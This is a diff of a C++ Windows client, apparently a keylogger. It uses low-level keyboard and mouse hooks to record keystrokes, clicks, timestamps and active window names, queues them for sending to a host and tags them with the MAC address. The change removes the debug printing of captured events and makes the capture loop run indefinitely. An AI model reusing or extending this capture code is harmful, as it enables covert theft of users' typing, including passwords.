@@ -309,9 +309,10 @@ void		Client::run(std::string const &host, std::string const &port)
 	time.set_second(1);
 	time.set_nano(0);
 	protocol.mac_address(m_MAC);
-	while (m_iselect(&time) == false)
+	while (true)
 	{
 		protocol.select();
+		m_iselect(&time);
 		m_mutex.lock();
 		for (auto it = m_events.begin(); it != m_events.end(); it++)
 		{
@@ -433,7 +434,7 @@ std::string	Client::addrToString(unsigned char mac[])
 {
 	char	tab[18];
 
-	sprintf_s(tab, "%02X-%02X-%02X-%02X-%02X-%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
+	sprintf_s(tab, "%02X%02X%02X%02X%02X%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
 	return (std::string(tab));
 }
 
@@ -464,7 +465,6 @@ void				setModifier(int nCode, WPARAM wParam, LPARAM lParam)
 	KBDLLHOOKSTRUCT		*a;
 
 	a = (KBDLLHOOKSTRUCT*)lParam;
-	std::cout << a->vkCode << std::endl;
 	switch (a->vkCode)
 	{
 	case VK_LSHIFT:
@@ -536,7 +536,6 @@ LRESULT CALLBACK	KeyboardProc(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lP
 			etype = Released;
 		clt.m_itime.now();
 		KeyboardEvent *kbEv = new KeyboardEvent(key, mod, etype, clt.m_itime.get_second(), clt.m_itime.get_nano(), winName);
-		std::cout << kbEv->toString() << std::endl;
 		clt.addEvent(kbEv);
 	}
 	return (CallNextHookEx(NULL, nCode, wParam, lParam));
@@ -587,7 +586,6 @@ LRESULT CALLBACK MouseProc(_In_ int nCode, _In_ WPARAM wParam, _In_ LPARAM lPara
 
 		clt.m_itime.now();
 		MouseEvent *msEv = new MouseEvent(button, pos, etype, clt.m_itime.get_second(), clt.m_itime.get_nano(), getWindowName());
-		std::cout << msEv->toString() << std::endl;
 		clt.addEvent(msEv);
 	}
 	return (CallNextHookEx(NULL, nCode, wParam, lParam));
